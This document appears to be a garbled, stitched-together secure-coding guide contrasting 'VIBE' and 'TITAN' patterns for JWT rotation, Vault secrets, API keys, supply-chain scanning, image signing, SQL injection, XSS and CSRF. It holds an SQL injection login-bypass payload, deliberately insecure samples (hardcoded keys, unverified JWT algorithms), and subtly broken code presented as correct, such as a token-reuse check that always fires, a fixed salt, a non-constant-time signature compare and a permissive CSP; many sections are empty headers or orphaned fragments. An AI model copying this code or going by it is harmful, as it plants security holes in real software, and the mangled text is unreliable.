            userId,
    createdAt: new Date(),
    expiresAt: new Date(Date.now() + 7 *24*60*60* 1000),  // 7 days
            });
    
    return jwt.sign(
    { sub: userId, jti: tokenId },
            this.secretKey,
    { algorithm: 'HS256', expiresIn: '7d' }
            );
        }
    
    async rotateRefreshToken(oldToken: string): Promise<{ accessToken: string; refreshToken: string }> {
    const decoded = this.verify(oldToken);
    
    // Revoke old token
    await this.tokenStore.revoke(decoded.jti);
    
    // Check if already revoked (token reuse attack)
    const stored = await this.tokenStore.get(decoded.jti);
    | if (!stored | stored.revokedAt) { |
    // Potential attack - revoke ALL user tokens
    await this.tokenStore.revokeAllForUser(decoded.sub);
    throw new AuthError('Token reuse detected', 'TOKEN_REUSE');
            }
    
    // Issue new tokens
    return {
    accessToken: this.sign({ sub: decoded.sub, role: decoded.role, permissions: decoded.permissions }),
    refreshToken: this.createRefreshToken(decoded.sub),
            };
        }
    }
    
    ## SECRETS MANAGEMENT WITH VAULT 2
    
    ### The Scar 7 2
    
    > "API keys in .env file. Committed to GitHub.
    > Private repo. Then made public for portfolio.
    > AWS keys exposed. $50k bill overnight.
    > Crypto miners spun up hundreds of instances."
    
    ## VIBE: Hardcoded secrets 2
    
    import os
    
    AWS_KEY = "AKIAIOSFODNN7EXAMPLE"  # Hardcoded!
    AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # Hardcoded!
    
    ## Or slightly better but still dangerous 2
    
    AWS_KEY = os.getenv("AWS_KEY")  # In .env, might get committed
    
    ## TITAN: HashiCorp Vault integration 2
    
    import hvac
    from functools import lru_cache
    from datetime import datetime, timedelta
    import logging
    
    class VaultSecretManager:
    """Production secrets management with HashiCorp Vault."""
    
    def **init**(self, vault_addr: str, auth_method: str = 'kubernetes'):
    self.client = hvac.Client(url=vault_addr)
    self.auth_method = auth_method
    self.lease_cache: dict[str, tuple[dict, datetime]] = {}
    
    ## Authenticate based on environment 2
    
            self._authenticate()
    
    def _authenticate(self):
    """Authenticate to Vault using appropriate method."""
    
    if self.auth_method == 'kubernetes':
    
    ## Read service account token 2
    
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
    jwt = f.read()
    
            self.client.auth.kubernetes.login(
            role='myapp',
            jwt=jwt
            )
    
    elif self.auth_method == 'aws':
    
    ## IAM authentication 2
    
            self.client.auth.aws.iam_login(
            role='myapp',
            mount_point='aws'
            )
    
    elif self.auth_method == 'approle':
    
    ## For CI/CD 2
    
    import os
            self.client.auth.approle.login(
            role_id=os.environ['VAULT_ROLE_ID'],
            secret_id=os.environ['VAULT_SECRET_ID']
            )
    
    def get_secret(self, path: str, key: str) -> str:
    """Get a secret value with caching and lease management."""
    
    ## Check cache 2
    
    cache_key = f"{path}:{key}"
    if cache_key in self.lease_cache:
    secret, expires_at = self.lease_cache[cache_key]
    if datetime.now() < expires_at:
    return secret[key]
    
    ## Fetch from Vault 2
    
    response = self.client.secrets.kv.v2.read_secret_version(
            path=path,
            mount_point='secret'
            )
    
    secret = response['data']['data']
    
    ## Cache with lease 2
    
    lease_duration = response.get('lease_duration', 3600)
    expires_at = datetime.now() + timedelta(seconds=lease_duration - 60)  # 60s buffer
    self.lease_cache[cache_key] = (secret, expires_at)
    
    return secret[key]
    
    def get_dynamic_database_credentials(self, role: str) -> tuple[str, str]:
    """Get dynamic database credentials (auto-rotating)."""
    
    response = self.client.secrets.database.generate_credentials(
            name=role,
            mount_point='database'
            )
    
    username = response['data']['username']
    password = response['data']['password']
    
    ## Log for audit 2
    
    logging.info(f"Generated dynamic DB creds for role {role}, lease_id: {response['lease_id']}")
    
    return username, password
    
    def rotate_api_key(self, key_name: str) -> str:
    """Rotate an API key with zero downtime."""
    
    ## 1. Generate new key 2
    
    new_key = secrets.token_urlsafe(32)
    
    ## 2. Read current key 2
    
    current = self.get_secret(f'api-keys/{key_name}', 'current')
    
    ## 3. Update Vault with both keys active 2
    
            self.client.secrets.kv.v2.create_or_update_secret(
            path=f'api-keys/{key_name}',
            secret={
    'current': new_key,
    'previous': current,  # Keep old key valid temporarily
    'rotated_at': datetime.now().isoformat()
            },
            mount_point='secret'
            )
    
    return new_key
    
    ## Usage 2
    
    vault = VaultSecretManager(
            vault_addr='<<<<<<https://vault.company.com',>>>>>>
            auth_method='kubernetes'
        )
    
    ## Get static secret 2
    
    api_key = vault.get_secret('myapp/config', 'stripe_api_key')
    
    ## Get dynamic database credentials 2
    
    db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')
    
    ## API KEY ROTATION 2
    
    ## The Scar 11
    
    > "Same API key for 3 years. Never rotated.
    > Employee left, still had the key.
    > Used it from competitor company.
    > No audit trail. Couldn't prove breach source."
    
    ## VIBE: Static API keys 2
    
    API_KEY = "static_key_never_changes_123"
    
        @app.get("/api/data")
    def get_data(api_key: str = Header()):
    if api_key != API_KEY:
    raise HTTPException(401)
    return {"data": "secret"}
    
    ## TITAN: Rotating API keys with audit trail 2
    
    from datetime import datetime, timedelta
    from typing import Optional
    import hashlib
    import secrets
    
    class APIKeyManager:
    """Production API key management with rotation and audit."""
    
    def **init**(self, db, redis):
    self.db = db
    self.redis = redis
    
    async def create_api_key(
            self,
    user_id: str,
    name: str,
    permissions: list[str],
    expires_in_days: int = 365
    ) -> tuple[str, str]:
    """Create new API key. Returns (key_id, secret) - secret shown only once!"""
    
    ## Generate key components 2
    
    key_id = f"sk_{secrets.token_urlsafe(8)}"
    key_secret = secrets.token_urlsafe(32)
    key_hash = self._hash_key(key_secret)
    
    ## Store in database (NEVER store the secret!) 2
    
    await self.db.api_keys.create(
            data={
    'id': key_id,
    'user_id': user_id,
    'name': name,
    'key_hash': key_hash,
    'permissions': permissions,
    'created_at': datetime.utcnow(),
    'expires_at': datetime.utcnow() + timedelta(days=expires_in_days),
    'last_used_at': None,
    'rotation_reminder_sent': False
            }
            )
    
    ## Audit log 2
    
    await self._audit_log(user_id, 'API_KEY_CREATED', {'key_id': key_id, 'name': name})
    
    ## Return full key (only time it's visible) 2
    
    full_key = f"{key_id}.{key_secret}"
    return key_id, full_key
    
    async def validate_key(self, full_key: str) -> Optional[dict]:
    """Validate API key and return permissions."""
    
            try:
    key_id, key_secret = full_key.split('.', 1)
    except ValueError:
    return None
    
    ## Check cache first 2
    
    cache_key = f"apikey:{key_id}"
    cached = await self.redis.get(cache_key)
    
    if cached:
    key_data = json.loads(cached)
            else:
    
    ## Fetch from database 2
    
    key_data = await self.db.api_keys.find_unique(
    where={'id': key_id}
            )
    
    if not key_data:
    return None
    
    ## Cache for 5 minutes 2
    
    await self.redis.setex(cache_key, 300, json.dumps(key_data))
    
    ## Verify hash 2
    
    if not self._verify_key(key_secret, key_data['key_hash']):
    await self._audit_log(None, 'API_KEY_INVALID_SECRET', {'key_id': key_id})
    return None
    
    ## Check expiration 2
    
    if datetime.fromisoformat(key_data['expires_at']) < datetime.utcnow():
    await self._audit_log(key_data['user_id'], 'API_KEY_EXPIRED', {'key_id': key_id})
    return None
    
    ## Check if revoked 2
    
    if key_data.get('revoked_at'):
    return None
    
    ## Update last used (async, don't block request) 2
    
            asyncio.create_task(self._update_last_used(key_id))
    
    return {
    'user_id': key_data['user_id'],
    'permissions': key_data['permissions'],
    'key_id': key_id
            }
    
    async def rotate_key(self, key_id: str) -> tuple[str, str]:
    """Rotate API key with grace period for old key."""
    
    old_key = await self.db.api_keys.find_unique(where={'id': key_id})
    
    if not old_key:
    raise ValueError("Key not found")
    
    ## Create new key 2
    
    new_key_id, new_full_key = await self.create_api_key(
            user_id=old_key['user_id'],
    name=f"{old_key['name']} (rotated)",
            permissions=old_key['permissions']
            )
    
    ## Mark old key for deprecation (still valid for 24 hours) 2
    
    await self.db.api_keys.update(
    where={'id': key_id},
            data={
    'deprecated_at': datetime.utcnow(),
    'expires_at': datetime.utcnow() + timedelta(hours=24)
            }
            )
    
    ## Invalidate cache 2
    
    await self.redis.delete(f"apikey:{key_id}")
    
    await self._audit_log(
            old_key['user_id'],
            'API_KEY_ROTATED',
    {'old_key_id': key_id, 'new_key_id': new_key_id}
            )
    
    return new_key_id, new_full_key
    
    def _hash_key(self, secret: str) -> str:
    """Hash API key secret for storage."""
    return hashlib.pbkdf2_hmac(
            'sha256',
            secret.encode(),
    b'api_key_salt_xyz', # Use proper salt from config
            100000
            ).hex()
    
    def _verify_key(self, secret: str, stored_hash: str) -> bool:
    """Verify key secret against stored hash."""
    return secrets.compare_digest(
            self._hash_key(secret),
            stored_hash
            )
    
    ## VOLUME 7: PRODUCTION DATABASE OPERATIONS
    
    ## VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY 2
    
    ## DEPENDENCY VULNERABILITY DISASTERS 2
    
    ### The Scar 8 2
    
    > "Log4Shell announced. Checked: we use log4j.
    > Where? 47 different services. Transitive dependency.
    > No SBOM. No dependency graph. Manual audit.
    > Took 2 weeks to find and patch everywhere."
    
    ## VIBE: No dependency scanning 2
    
    ## Just run npm install and hope nothing bad happens 2
    
    ## TITAN: GitHub Actions with dependency scanning and SBOM 2
    
    name: Security Pipeline
    
        on:
          push:
    branches: [main]
          pull_request:
          schedule:
    
    - cron: '0 6 * * *'  # Daily vulnerability check
    
        jobs:
          dependency-scan:
    runs-on: ubuntu-latest
            steps:
    
    - uses: actions/checkout@v4
    
    ## Generate SBOM (Software Bill of Materials) 2
    
    - name: Generate SBOM
    
    uses: anchore/sbom-action@v0
            with:
    path: .
    format: spdx-json
    output-file: sbom.spdx.json
    
    ## Scan for vulnerabilities 2
    
    - name: Vulnerability Scan
    
    uses: anchore/scan-action@v3
            with:
    sbom: sbom.spdx.json
    fail-build: true
    severity-cutoff: high
    
    ## Check for known malicious packages 2
    
    - name: Malware Scan
    
    | run: |
    npx lockfile-lint --path package-lock.json \
    --validate-https \
    --validate-package-names \
            --validate-checksum
    
    ## Upload SBOM as artifact 2
    
    - uses: actions/upload-artifact@v3
    
            with:
    name: sbom
    path: sbom.spdx.json
    
    ## Attest SBOM for provenance 2
    
    - uses: actions/attest-sbom@v1
    
            with:
    subject-path: sbom.spdx.json
    sbom-path: sbom.spdx.json
    
          container-security:
    runs-on: ubuntu-latest
            steps:
    
    - uses: actions/checkout@v4
    
    - name: Build image
    
    run: docker build -t myapp:${{ github.sha }} .
    
    ## Scan container image 2
    
    - name: Trivy container scan
    
    uses: aquasecurity/trivy-action@master
            with:
    image-ref: myapp:${{ github.sha }}
    format: sarif
    output: trivy-results.sarif
    severity: 'CRITICAL,HIGH'
    exit-code: 1
    
    ## Upload scan results 2
    
    - uses: github/codeql-action/upload-sarif@v2
    
            with:
    sarif_file: trivy-results.sarif
    
    ## TITAN: Continuous dependency monitoring 2
    
    from dataclasses import dataclass
    from datetime import datetime
    import subprocess
    import json
    
    @dataclass
    class VulnerabilityAlert:
    package: str
    version: str
    severity: str
    cve_id: str
    | fixed_version: str | None |
    affected_services: list[str]
    
    class DependencyMonitor:
    def **init**(self, github_token: str, slack_webhook: str):
    self.github = github_token
    self.slack = slack_webhook
    self.known_vulns: set[str] = set()
    
    async def scan_monorepo(self, repo_path: str) -> list[VulnerabilityAlert]:
    """Scan all services in monorepo for vulnerabilities."""
    alerts = []
    
    ## Find all package.json files 2
    
    result = subprocess.run(
    ['find', repo_path, '-name', 'package.json', '-not', '-path', '*/node_modules/*'],
    capture_output=True, text=True
            )
    
    package_files = result.stdout.strip().split('\n')
    
    for pkg_file in package_files:
    service_name = pkg_file.split('/')[-2]
    
    ## Run npm audit 2
    
    audit_result = subprocess.run(
    ['npm', 'audit', '--json'],
    cwd=pkg_file.rsplit('/', 1)[0],
    capture_output=True, text=True
            )
    
            try:
    audit_data = json.loads(audit_result.stdout)
    
    for vuln_id, vuln_info in audit_data.get('vulnerabilities', {}).items():
    if vuln_info['severity'] in ['high', 'critical']:
    alert = VulnerabilityAlert(
            package=vuln_id,
    version=vuln_info.get('range', 'unknown'),
            severity=vuln_info['severity'],
    cve_id=vuln_info.get('via', [{}])[0].get('cve', 'N/A'),
    fixed_version=vuln_info.get('fixAvailable', {}).get('version'),
            affected_services=[service_name]
            )
    
    ## Deduplicate 2
    
    alert_key = f"{alert.package}:{alert.cve_id}"
    if alert_key not in self.known_vulns:
            alerts.append(alert)
            self.known_vulns.add(alert_key)
    except json.JSONDecodeError:
            continue
    
    return alerts
    
    async def notify_security_team(self, alerts: list[VulnerabilityAlert]):
    """Send Slack notification for new vulnerabilities."""
    if not alerts:
            return
    
    critical = [a for a in alerts if a.severity == 'critical']
    high = [a for a in alerts if a.severity == 'high']
    
    message = {
    "blocks": [
            {
    "type": "header",
    "text": {
    "type": "plain_text",
    "text": {len(alerts)} New Vulnerabilities Detected"
            }
            },
            {
    "type": "section",
    "text": {
    "type": "mrkdwn",
    | "text": f"*Critical:*{len(critical)} | *High:* {len(high)}" |
            }
            }
            ]
            }
    
    for alert in critical[:5]:  # Top 5 critical
            message["blocks"].append({
    "type": "section",
    "text": {
    "type": "mrkdwn",
    "text": f"*{alert.package}* ({alert.cve_id})\n"
    f"Services: {', '.join(alert.affected_services)}\n"
    f"Fix: Upgrade to `{alert.fixed_version}`"
            }
            })
    
    await self._send_slack(message)
    
    ## CONTAINER IMAGE SIGNING 2
    
    ## The Scar 12
    
    > "Deployed to production. Image pulled from registry.
    > Someone had pushed a backdoored image with same tag.
    > No signature verification. Running attacker's code.
    > Detected 3 weeks later during security audit."
    
    ## VIBE: Pull any image, trust registry 2
    
    spec:
      containers:
    
    - image: registry.io/app:latest  # Anyone could have pushed this
    
    ## TITAN: Cosign image signing and verification 2
    
    name: Sign and Verify Images
    
        jobs:
          build-sign-push:
    runs-on: ubuntu-latest
            permissions:
    id-token: write  # For keyless signing
    packages: write
    
            steps:
    
    - uses: actions/checkout@v4
    
    - name: Install Cosign
    
    uses: sigstore/cosign-installer@v3
    
    - name: Login to Registry
    
    uses: docker/login-action@v3
            with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}
    
    - name: Build and Push
    
    id: build
    uses: docker/build-push-action@v5
            with:
    push: true
    tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
    
    ## Sign with keyless signing (Sigstore) 2
    
    - name: Sign Image
    
            env:
    COSIGN_EXPERIMENTAL: 1
    | run: |
    cosign sign --yes \
    ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
    
    ## Attest SBOM 2
    
    - name: Attest SBOM
    
    | run: |
    cosign attest --yes \
    --predicate sbom.spdx.json \
    --type spdxjson \
    ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
    
    ## TITAN: Kubernetes admission controller for signature verification 2
    
    ## Kyverno policy 2
    
    apiVersion: kyverno.io/v1
    kind: ClusterPolicy
    metadata:
    name: verify-image-signature
    spec:
    validationFailureAction: Enforce
    background: false
      rules:
    
    - name: verify-cosign-signature
    
          match:
            any:
    
    - resources:
    
            kinds:
    
    - Pod
    
          verifyImages:
    
    - imageReferences:
    - "ghcr.io/company/*"
    
            attestors:
    
    - entries:
    - keyless:
    
    issuer: "<<<<<<https://token.actions.githubusercontent.com">>>>>>
    subject: "<<<<<<https://github.com/company/*/.github/workflows/*">>>>>>
            rekor:
    url: <<<<<<https://rekor.sigstore.dev>>>>>>
            attestations:
    
    - predicateType: <<<<<<https://spdx.dev/Document>>>>>>
    
            conditions:
    
    - all:
    - key: "{{ creationInfo.created }}"
    
    operator: GreaterThan
    value: "2024-01-01T00:00:00Z"
    
    ## VOLUME 8: DATABASE REPLICATION PATTERNS
    
    ## ?? ADVANCED SECURITY PATTERNS 2
    
    > **The patterns that protect applications**
    
    ---
    
    ## ?? AUTHENTICATION DEEP DIVE 2
    
    > **The patterns for secure auth**
    
    ---
    
    ## ?? INPUT VALIDATION 2
    
    > **The patterns for secure data handling**
    
    ---
    
    ## ?? CORS EXPLAINED 2
    
    > **The patterns for cross-origin requests**
    
    ---
    
    ## ?? ENCRYPTION PATTERNS 2
    
    > **The patterns for protecting data**
    
    ---
    
    ## ?? API SECURITY CHECKLIST 2
    
    > **The patterns for secure APIs**
    
    ---
    
    ## ?? ZERO TRUST SECURITY 2
    
    > **The patterns for modern security**
    
    ---
    
    ## ?? CONTENT SECURITY POLICY 2
    
    > **The patterns for XSS prevention**
    
    ---
    
    ## ?? API KEY PATTERNS 2
    
    > **The secure API key implementation**
    
    ---
    
    ## ?? OAUTH 2.0 FLOWS 2
    
    > **The correct OAuth implementation**
    
    ---
    
    ## ?? SUBDOMAIN TAKEOVER PREVENTION 2
    
    > **The DNS security patterns**
    
    ---
    
    ## ?? RATE LIMIT BYPASS PREVENTION 2
    
    > **The security patterns for rate limiting**
    
    ---
    
    ## ?? SECURE FILE UPLOAD 2
    
    > **The patterns for safe file handling**
    
    ---
    
    ## ?? DEPENDENCY SCANNING 2
    
    > **The patterns for secure dependencies**
    
    ---
    
    ## ?? CSRF PREVENTION PATTERNS 2
    
    > **The cross-site request forgery protection**
    
    ---
    
    ## ?? XSS PREVENTION PATTERNS 2
    
    > **The cross-site scripting protection**
    
    ---
    
    ## ?? SECURE HEADERS CONFIGURATION 2
    
    > **The HTTP security headers**
    
    ---
    
    ## AUTHENTICATION 2 2
    
    - Password hashing: bcrypt, scrypt, Argon2id
    
    - MFA: TOTP, WebAuthn, FIDO2, SMS (weak)
    
    - Session: HttpOnly, Secure, SameSite cookies
    
    - JWT: RS256, short expiry, refresh rotation
    
    - OAuth 2.0: PKCE, state param, audience validation
    
    - Passkeys: credential manager, cross-device
    
    ## AUTHORIZATION 2 2
    
    - RBAC: roles, permissions, inheritance
    
    - ABAC: attributes, policies, context
    
    - ReBAC: relationship-based, graph
    
    - PBAC: policy engines, OPA, Cedar
    
    - Least privilege: minimal access, regular audit
    
    - Zero trust: never trust, always verify
    
    ## INPUT VALIDATION 3 2
    

import { z } from 'zod';

// ? TITAN: Validate ALL user input
const userSchema = z.object({
email: z.string().email(),
password: z.string().min(8).max(128),
name: z.string().min(1).max(100),
age: z.number().int().min(0).max(150).optional(),
});

async function createUser(req, res) {
// Validate input
const result = userSchema.safeParse(req.body);

if (!result.success) {
return res.status(400).json({
error: 'Validation failed',
details: result.error.issues
    });
  }

// Use validated data
const user = await db.user.create({
data: result.data
  });

return res.json(user);
}

// For file uploads
const fileSchema = z.object({
mimetype: z.enum(['image/jpeg', 'image/png', 'image/webp']),
size: z.number().max(5 *1024* 1024),  // 5MB max
});

    
    ---
    
    ## SECURITY HEADERS 2 2
    
    ## ?? SECURITY - PENETRATION TESTING 2
    
    > **The offensive security patterns**
    
    ---
    
    ## ?? INCIDENT RESPONSE PLAYBOOK 2
    
    > **The security incident handling**
    
    ---
    
    ## ?? SECRETS ROTATION 2
    
    > **The credential lifecycle patterns**
    
    ---
    
    ## ?? AUTHENTICATION PATTERNS 2
    
    > **The auth implementation patterns**
    
    ---
    
    ## ?? SECURITY LOGGING 2
    
    > **The audit and security event patterns**
    
    ---
    
    ## ?? INPUT VALIDATION PATTERNS 2
    
    > **The data sanitization patterns**
    
    ---
    
    ## ?? SECURE SESSION MANAGEMENT 2
    
    > **The session security patterns**
    
    ---
    
    ## ?? SECURITY HEADERS DEEP DIVE 2
    
    > **The essential HTTP security headers**
    
    ---
    
    ## ?? PASSWORD SECURITY 2
    
    > **The authentication security patterns**
    
    ---
    
    ## ?? API AUTHENTICATION PATTERNS 2
    
    > **The secure API access patterns**
    
    ---
    
    ## ?? RBAC IMPLEMENTATION 2
    
    > **Role-Based Access Control patterns**
    
    ---
    
    ## ?? MFA IMPLEMENTATION 2
    
    > **Multi-factor authentication patterns**
    
    ---
    
    ## ?? SECURITY SCANNING 2
    
    > **The automated vulnerability detection**
    
    ---
    
    ## Dependency Scanning 3 2
    

## ?? ACCOUNT SECURITY PATTERNS 2

> **The user account protection patterns**

---

## ?? OAUTH 2.0 DEEP DIVE 2

> **The authorization patterns**

---

## ENVIRONMENT VARIABLES 2 2

> **The secrets management patterns**

---

## COOKIE SECURITY 2 2

> **The session patterns that don't get hacked**

---

## Query: SELECT * FROM users WHERE email = 'admin'--' 2

## Password check bypassed 2 2

## Log4j downloads and executes attacker's code 2 2

## VULNERABLE: algorithms not specified 2 2

payload = jwt.decode(token, secret_key)  # Accepts 'none'!
return payload

## 3. Server verifies with same "secret" = valid signature 2 2

## Attacker can detect the difference 2 2

## TITAN: Constant-time comparison 2 2

import hmac
import secrets

def verify_api_key(provided_key: str, stored_key: str) -> bool:

## With input: 'a' * 30 + '!' 2

## Converts l, a, III, etc 2 2

normalized = unicodedata.normalize('NFKC', username)

## Don't use .lower() for security comparisons 2 2

import icu  # PyICU
return icu.UnicodeString(text).toLower(icu.Locale(locale))

    
    ## ? WRONG: [...nextAuth].ts (capital A) 2
    
    ## ? CORRECT: [...nextauth].ts (lowercase) 2
    
    ## Git might not track case-only changes 2
    
    ## SQL Injection Prevention 3
    

// NEVER do this
const query = `SELECT * FROM users WHERE id = ${userId}`;

// DO this - parameterized queries
const result = await db.query(
'SELECT * FROM users WHERE id = $1',
  [userId]
);

// With Prisma ORM (safe by default)
const user = await prisma.user.findUnique({
where: { id: userId }
});

// Input validation before database
const userIdSchema = z.string().uuid();
const validatedId = userIdSchema.parse(userId);

    
    ---
    
    ## XSS Prevention 3 2
    

// React auto-escapes by default
function SafeComponent({ userContent }: { userContent: string }) {
return <div>{userContent}</div>; // Safe - auto-escaped
}

// DANGER: dangerouslySetInnerHTML
function UnsafeComponent({ html }: { html: string }) {
// Only use with trusted/sanitized content
return <div dangerouslySetInnerHTML={{ __html: html }} />; // DANGER
}

// Sanitize if you must render HTML
import DOMPurify from 'dompurify';

function SanitizedHTML({ html }: { html: string }) {
const cleanHtml = DOMPurify.sanitize(html, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

// Content Security Policy header
// next.config.js
const securityHeaders = [
  {
key: 'Content-Security-Policy',
value: `
default-src 'self';
script-src 'self' 'unsafe-eval' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' blob: data:;
font-src 'self';
connect-src 'self' <<https://api.example.com;>>
`.replace(/\s+/g, ' ').trim()
  }
];

    
    ---
    
    ## CSRF Protection 2 2
    

// csrf.ts - CSRF token generation and validation
import { randomBytes, createHmac } from 'crypto';

const SECRET = process.env.CSRF_SECRET!;

function generateCsrfToken(sessionId: string): string {
const timestamp = Date.now().toString(36);
const random = randomBytes(16).toString('hex');
const payload = `${sessionId}.${timestamp}.${random}`;
const signature = createHmac('sha256', SECRET)
    .update(payload)
    .digest('hex');

return `${payload}.${signature}`;
}

function validateCsrfToken(token: string, sessionId: string): boolean {
const parts = token.split('.');
if (parts.length !== 4) return false;

const [tokenSession, timestamp, random, signature] = parts;

if (tokenSession !== sessionId) return false;

// Check token age (1 hour max)
const tokenAge = Date.now() - parseInt(timestamp, 36);
if (tokenAge > 3600000) return false;

const payload = `${tokenSession}.${timestamp}.${random}`;
const expectedSig = createHmac('sha256', SECRET)
    .update(payload)
    .digest('hex');

return signature === expectedSig;
}

// Middleware
function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
const token = req.headers['x-csrf-token'] as string;
const sessionId = req.session?.id;

| if (!token |  | !sessionId |  | !validateCsrfToken(token, sessionId)) { |
return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
}

    
    ---
    
